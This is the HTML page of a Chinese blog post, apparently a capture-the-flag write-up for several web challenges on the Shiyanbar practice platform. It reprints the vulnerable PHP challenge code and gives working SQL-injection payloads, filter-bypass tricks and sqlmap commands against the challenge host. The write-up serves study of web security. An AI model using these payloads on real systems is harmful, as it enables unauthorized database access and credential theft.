@@ -1,0 +1,929 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,Writeup," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="00x1 到底是不是number呢？首先抓包看流量，看到Response包里有个 打开这个目录，得到原码分析原码">
+<meta name="keywords" content="CTF,Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧决斗场Writeup">
+<meta property="og:url" content="http://whc.dropsec.xyz/2017/04/20/实验吧决斗场Writeup/index.html">
+<meta property="og:site_name" content="Ha1g0的窝">
+<meta property="og:description" content="00x1 到底是不是number呢？首先抓包看流量，看到Response包里有个 打开这个目录，得到原码分析原码">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://i1.piimg.com/567571/63ae606b7d046199.png">
+<meta property="og:image" content="http://i2.muimg.com/567571/653007b080685217.png">
+<meta property="og:image" content="http://i4.buimg.com/567571/8c8497335fce0340.png">
+<meta property="og:image" content="http://i4.buimg.com/567571/e5efecae96d59114.png">
+<meta property="og:image" content="http://i4.buimg.com/567571/4f0e92e33f55f353.png">
+<meta property="og:image" content="http://i1.piimg.com/588926/799499324a1ff4b8.png">
+<meta property="og:updated_time" content="2017-06-15T13:50:06.023Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="实验吧决斗场Writeup">
+<meta name="twitter:description" content="00x1 到底是不是number呢？首先抓包看流量，看到Response包里有个 打开这个目录，得到原码分析原码">
+<meta name="twitter:image" content="http://i1.piimg.com/567571/63ae606b7d046199.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://whc.dropsec.xyz/2017/04/20/实验吧决斗场Writeup/"/>
+
+
+
+
+
+  <title> 实验吧决斗场Writeup | Ha1g0的窝 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+    <a href="https://github.com/whcjst"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/a6677b08c955af8400f44c6298f40e7d19cc5b2d/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f677261795f3664366436642e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png"></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ha1g0的窝</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://whc.dropsec.xyz/2017/04/20/实验吧决斗场Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ha1g0">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://i2.muimg.com/567571/93e407bf4ec3ebb7.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ha1g0的窝">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                实验吧决斗场Writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-20T12:23:05+08:00">
+                2017-04-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="00x1-到底是不是number呢？"><a href="#00x1-到底是不是number呢？" class="headerlink" title="00x1 到底是不是number呢？"></a>00x1 到底是不是number呢？</h3><p>首先抓包看流量，看到Response包里有个<br><img src="http://i1.piimg.com/567571/63ae606b7d046199.png" alt=""></p>
+<p>打开这个目录，得到原码<br>分析原码<br><a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$info = <span class="string">""</span>;</div><div class="line">$req = [];   <span class="comment">//数组</span></div><div class="line">$flag=<span class="string">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>;</div><div class="line"></div><div class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);</div><div class="line">error_reporting(<span class="number">0</span>);           <span class="comment">//关闭错误报告</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'number'</span>]))&#123;</div><div class="line">   header(<span class="string">"hint:26966dc52e85af40f59b4fe73d8c323a.txt"</span>); <span class="comment">//发送http头</span></div><div class="line"></div><div class="line">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">foreach</span>([$_GET, $_POST] <span class="keyword">as</span> $global_var) &#123; <span class="comment">//把get或者post进去的值取做全局var</span></div><div class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123; <span class="comment">//字符串的键值自动变成下标</span></div><div class="line">        $value = trim($value); <span class="comment">//把value两边的空格啥的去掉</span></div><div class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value);<span class="comment">//if(is_string)成立则把value中的双引号前加\赋值给</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123;     <span class="comment">//判断是不是回文数字</span></div><div class="line">    $number = strval($number);                        <span class="comment">//把数字的字符串值传给number</span></div><div class="line">    $i = <span class="number">0</span>;</div><div class="line">    $j = strlen($number) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span>($i &lt; $j) &#123;</div><div class="line">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">        $i++;</div><div class="line">        $j--;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>]))&#123;                  <span class="comment">//检测是否为是数字字符串，不是则报错</span></div><div class="line"></div><div class="line">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</div><div class="line"></div><div class="line">&#125;<span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>])))&#123; <span class="comment">//</span></div><div class="line"></div><div class="line">     $info = <span class="string">"number must be equal to it's integer!! "</span>;</div><div class="line"></div><div class="line">&#125;  </div><div class="line"><span class="keyword">else</span>&#123;  </div><div class="line"></div><div class="line">     $value1 = intval($req[<span class="string">"number"</span>]);</div><div class="line">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));</div><div class="line"></div><div class="line">     <span class="keyword">if</span>($value1!=$value2)&#123;</div><div class="line">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</div><div class="line">     &#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</div><div class="line">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>;</div><div class="line">          &#125;<span class="keyword">else</span>&#123;</div><div class="line">             $info=$flag;</div><div class="line">          &#125;</div><div class="line">     &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $info;</div></pre></td></tr></table></figure></p>
+<p>首先你GET或者POST进去的参数必须是字符型数字，想到用unicode码 %20 空格 和%00 来让它变成字符型数字，最后还要确定输入的字符型数字不为回文，看到网上的思路 0e-0可一用来绕过。</p>
+<h3 id="00x2-登陆一下好吗？"><a href="#00x2-登陆一下好吗？" class="headerlink" title="00x2 登陆一下好吗？"></a>00x2 登陆一下好吗？</h3><p>这道题你随便输入写什么，他都会跳给你一个页面，比如说我在账号里输入一个a<br>我猜测它存在SQL注入</p>
+<p>尝试一下万能密码<br>admin’ or ‘1’=’1</p>
+<p>万能密码原理：<br>在SQL语言中 and优先于or<br> not and or<br>所以逻辑从先or  再and 变成了   先and 再or<br>or前后2个条件只要有一个成立就行了<br><img src="http://i2.muimg.com/567571/653007b080685217.png" alt=""></p>
+<p>回到这道题上，放入万能密码后<br><img src="http://i4.buimg.com/567571/8c8497335fce0340.png" alt=""><br>明显过滤了or，那么‘or’的万能密码就不能用了，只能重新构造。<br>看看还过滤了什么<br><img src="http://i4.buimg.com/567571/e5efecae96d59114.png" alt=""></p>
+<p>猜测<br>原语句应该为 select * from user where username=’’ and password=’’</p>
+<p>当提交username=pcat’=’&amp;password=pcat’=’<br>语句会变成如下：<br>select * from user where username=’pcat’=’’ and password=’pcat’=’’<br>这时候还不够清晰，我提取前一段判断出来（后面的同样道理）<br>username=’pcat’=’’<br>这是有2个等号，然后计算顺序从左到右，<br>先计算username=’pcat’ 一般数据库里不可能有我这个小名（若有，你就换一个字符串），所以这里返回值为0（相当于false）<br>然后0=’’ 这个结果呢？看到这里估计你也懂了，就是返回1（相当于true）</p>
+<p>其实就是个php弱类型比较，让我(ˇ?ˇ) 想我还真的想不到这种方法。</p>
+<p>说白了这道题也就过滤了一个 or –让你没法注释，还有一般的万能密码。</p>
+<h3 id="00x3-因垂丝汀的绕过"><a href="#00x3-因垂丝汀的绕过" class="headerlink" title="00x3 因垂丝汀的绕过"></a>00x3 因垂丝汀的绕过</h3><p>在源码注释看到了source.txt，打开发现原码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="comment">//前端页面</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//一个过滤函数</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123; </div><div class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</div><div class="line">        $StrValue=implode($StrValue); <span class="comment">//implode函数是将 一位数组转化为字符串</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123; </div><div class="line">        <span class="keyword">print</span> <span class="string">"水可载舟，亦可赛艇"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123;</div><div class="line">    AttackFilter($key,$value,$filter);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!$con)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">$db=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db($db, $con);</div><div class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</div><div class="line">$query = mysql_query($sql);</div><div class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123;</div><div class="line">    $key = mysql_fetch_array($query);</div><div class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>这个代码不复杂，就是查询一个是否存在数据库中的 数据，如果账户密码相同则输出flag，账户相同密码不同则输出 “一颗赛艇”，注意下mysql_num_rows作用是取得结果集中行的数目，表示取得uname是否存在。<br>这个代码先把post上去的数据中“and|select|from|where|union|join|sleep|benchmark|”全部去除，所以基本上一般的注入不可行。但是他没有过滤or，所以感觉可以构造万能密码类似的playload来绕过 mysql_num_rows($query) == 1<br>palayload:<br>uname=admin’ or 1=1#&amp;pwd=<br>一颗赛艇<br>结果集中只取一个，所以加上limit限制<br>playload:<br>uname=admin’ or 1=1 limit 1#&amp;pwd=<br>亦可赛艇</p>
+<p>现在不知道密码，看到是 == ，弱类型，一开始想的是用 pwd[]=来绕过，但是上面已经用过数组直接转换为字符型了，所以不行。<br>看网上的wp，说利用 group by with rollup来绕过，这个with rollup来改善统计性能的 。<br>-mysql&gt; select dep,pos,avg(sal) from employee group by dep,pos with rollup;<br>+——+——+———–+<br> | dep | pos | avg(sal) |<br>+——+——+———–+<br> | 01 | 01 | 1500.0000 |<br> | 01 | 02 | 1950.0000 |<br> | 01 | NULL | 1725.0000 |<br> | 02 | 01 | 1500.0000 |<br> | 02 | 02 | 2450.0000 |<br> | 02 | NULL | 2133.3333 |<br> | 03 | 01 | 2500.0000 |<br> | 03 | 02 | 2550.0000 |<br> | 03 | NULL | 2533.3333 |<br> | NULL | NULL | 2090.0000 |<br> +——+——+———–+<br>其实就是多出一行来统计类似平均数的，可以利用的点就是group by 后面的字段在最后一行是NULL，所以就是利用到题目上就是NULL=空字符串<br>playload:<br>uname=admin’ or 1=1 group by pwd with rollup limit 1 offset 2#&amp;pwd=<br>至于为什么是第3条数据，这个就是一个个猜出来的。</p>
+<p>offset是来代替“，”的，但是意思有所区别。<br><img src="http://i4.buimg.com/567571/4f0e92e33f55f353.png" alt=""><br>limit 1 offset 2 是取到2，而limit1，2是取2个。</p>
+<h3 id="00x4-简单的sql注入"><a href="#00x4-简单的sql注入" class="headerlink" title="00x4 简单的sql注入"></a>00x4 简单的sql注入</h3><p>我做sql注入题目的一般思路</p>
+<ol>
+<li>判断有没有读写权限</li>
+<li>判断注入点</li>
+<li>查出基本信息</li>
+<li>爆表爆列爆用户名密码</li>
+</ol>
+<p>做这道题目的时候，下意识的查看了一下原码，发现表单那里post上去的字段名是id，那么联想到sqllab了。<br>输入数值1返回结果：  </p>
+<blockquote>
+<p>ID: 1<br>name: baloteli</p>
+</blockquote>
+<p>在输入1\：</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’’ at line 1</p>
+</blockquote>
+<p>可见输入的是字符型，注入点存在，and 1 2一下，</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘1=1+’’ at line 1    </p>
+</blockquote>
+<p>说明好像过滤掉了些东，fuzz测试一下（模糊测），输入</p>
+<blockquote>
+<p>1 and or where union select database() sleep() information_schema schemata column from # –</p>
+</blockquote>
+<p>返回结果：</p>
+<blockquote>
+<p>ID: 1 or where<br>name: baloteli</p>
+</blockquote>
+<p>从id项看出有几个已经被过滤掉了，而且是直接把关键字给去掉，那么可以用类似ab(abc)c来绕过过滤，abc是要绕过的关键字，使用时不加括号，这里加括号只是为了区分，也就是过滤了select，那么我在select周围加了一个select不就行了，selecselectt，把里面select过滤了，外面的selec 和t组合一下就是一个select。</p>
+<ul>
+<li>开始爆一下一些基本信息<blockquote>
+<p>id=1’ ununionion seselectlect database() frofromm information_schema.schemata wherwheree ‘1’=’1  </p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘seselectlect database() frofromm information_schema.schemata wherwheree ‘1’=’1’’ at line 1</p>
+</blockquote>
+</li>
+</ul>
+<p>看到出错的信息还是这样，没有union那几个关键词没有过滤掉，还是哪里出现了问题，思路应该是没有问题的，我看了一看浏览器的url，发现。。。里面关键词前面有个+号，过滤了空格，坑死爹了。那么更改plagload:</p>
+<blockquote>
+<p>id=1’+ununionion+seselectlect+database()+frofromm+information_schema.schemata+wherwheree+’1’=’1  </p>
+</blockquote>
+<p>还是上面的错误，那么多加个空格呢</p>
+<blockquote>
+<p>id=1’ +ununionion +seselectlect +database() +frofromm +information_schema.schemata +wherwheree +’1’=’1  </p>
+</blockquote>
+<p>还是不行<br>全换成空格呢(注意是2个空格，有可能hexo主题的原因把我的空格吃了)</p>
+<blockquote>
+<p>id=1’  ununionion  seselectlect  database()  frofromm  information_schema.schemata  wherwheree  ‘1’=’1  </p>
+</blockquote>
+<p>发现。。。ab(abc)c这样的形式不行，换成abcabc这样的形式，发现可以，具体的我也不清楚,有可能是正则的问题。  </p>
+<blockquote>
+<p>id=1’  unionunion  selectselect  database()  fromfrom  information_schema.schemata  wherewhere  ‘1’=’1</p>
+<p>ID: 1’ union select database() from information_schema.schemata where ‘1’=’1<br>name: baloteli<br>ID: 1’ union select database() from information_schema.schemata where ‘1’=’1<br>name: web1</p>
+</blockquote>
+<p>那么其他的都是简单操作了<br>不再一一操作上playload了<br>除了。。。在爆列名的时候，又过滤了column_name和information_schema.columns以外就没什么  </p>
+<blockquote>
+<p>id=1’  unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns wherewhere  table_name=’flag</p>
+</blockquote>
+<p>这个也很奇怪，有的时候需要用到abcabc的形式，有的时候要用到ab(abc)c</p>
+<h3 id="00x5-简单的sql注入2"><a href="#00x5-简单的sql注入2" class="headerlink" title="00x5 简单的sql注入2"></a>00x5 简单的sql注入2</h3><p>答题思路大体上都是那样。这里有一些不一样，就是检测到空格和一些其他关键字就直接die(“SQLi detected”)，不知道后台是否存在关键词的替代。<br>根据wp的猜测<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for_each ($query_list <span class="keyword">as</span> $value) &#123;  </div><div class="line">	<span class="keyword">if</span> (in_array($value,$filter_array)) &#123;  </div><div class="line">		<span class="keyword">die</span>(<span class="string">"SQLi detected"</span>) ;</div></pre></td></tr></table></figure></p>
+<p>就是直接检测是否存在这些关键词，有的话直接输出这个SQLi detected。替换就跟上面那个一样多加一层。<br>于是就测试一下。<br>先输入 1\，还是字符型。<br>那么加个几个关键词<br>1’ and ‘1’=’1<br>SQLi detected<br>不知道是and还是其他北过滤了，把and去掉，改成1’=’1，进去了，改成1’and，没有空格，发现了空格在那个过滤数组中，那么绕过空格，把每一个 空格都替换成/<em>*/，(因为HTML语法和md语法的原因我的</em>被吃了，所以补上playload了)<br><img src="http://i1.piimg.com/588926/799499324a1ff4b8.png" alt=""></p>
+<p>剩下的就没什么了。</p>
+<h3 id="00x6-简单的sql注入3"><a href="#00x6-简单的sql注入3" class="headerlink" title="00x6 简单的sql注入3"></a>00x6 简单的sql注入3</h3><p>手注没有注入出来，他说是报错注入。。。然后我就傻乎乎地用那几个报错函数死命的注入。。。最后回显一个don’t。。。看来只能盲注了。盲注手工太麻烦了。。。直接上sqlmap</p>
+<p>判断注入点  </p>
+<blockquote>
+<p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“</p>
+</blockquote>
+<p>判断数据库  </p>
+<blockquote>
+<p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ –dbs</p>
+</blockquote>
+<p>判断表名  </p>
+<blockquote>
+<p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“  –tables</p>
+</blockquote>
+<p>判断字段名  </p>
+<blockquote>
+<p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -T “表名” –columns</p>
+</blockquote>
+<p>查内容  </p>
+<blockquote>
+<p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“  –dump  -T “flag” -C “flag”</p>
+</blockquote>
+<p>以后做到哪，这篇博客就跟到哪。。。哈哈哈~</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+	<div>
+  
+    
+<div style="text-align:center;color: #ccc;font-size:14px;">
+------ 本文结束 ------</div>
+<br/>
+<div style="border: 1px solid black">
+<div style="margin-left:10px">
+<span style="font-weight:blod">版权声明</span>
+<img src="http://7xqmjb.com1.z0.glb.clouddn.com/2017020242973cc.png" >
+<br/>
+<p style="font-size: 10px;line-height: 30px"><a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo的窝</a> by <a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo</a> is licensed under a <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">Creative Commons BY-NC-ND 4.0 International License</a>.<br/>
+由<a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo</a>创作并维护的<a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo的窝</a>博客采用<a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">创作共用保留署名-非商业-禁止演绎4.0国际许可证</a>。<br/>
